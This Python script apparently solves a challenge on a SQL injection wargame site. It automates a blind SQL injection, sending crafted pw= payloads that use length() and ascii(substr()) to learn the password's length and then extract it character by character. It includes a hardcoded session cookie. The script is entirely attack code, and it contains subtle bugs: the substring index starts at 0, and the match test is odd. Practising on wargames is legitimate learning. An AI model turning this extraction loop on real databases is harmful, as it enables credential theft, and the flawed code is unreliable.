import requests
headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
cookies={"PHPSESSID":"t0avihbhbtbour1pss5kh8bp97"}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
signature = "Hello guest"
password_len=0
output_key=""
for pw_len in range(2,19):
    url_query = url+"a%27||length(pw)={}%23".format(pw_len)
    re = requests.get(url_query, headers=headers, cookies=cookies)
    if re.text.find(signature) != -1:
        password_len=pw_len #길이 담기
print("length of pw : {}".format(password_len))
for i in range(password_len):
    for ascii_code in range(ord('0'),ord('z')):
        find_pw_req_url=url+"a%27||ascii(substr(pw,{},1))={}%23".format(i, ascii_code)
        print("output url : {}".format(find_pw_req_url))
        res_result = requests.get(find_pw_req_url, headers=headers, cookies=cookies)
        if res_result.text.find(signature) > 5:
            print("[+] process {}".format(chr(ascii_code)))
            output_key+=chr(ascii_code)
            break
print("end %s" % output_key)
        #print("a%27||ascii(substr(pw,1,1))=101%23")
        #https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=
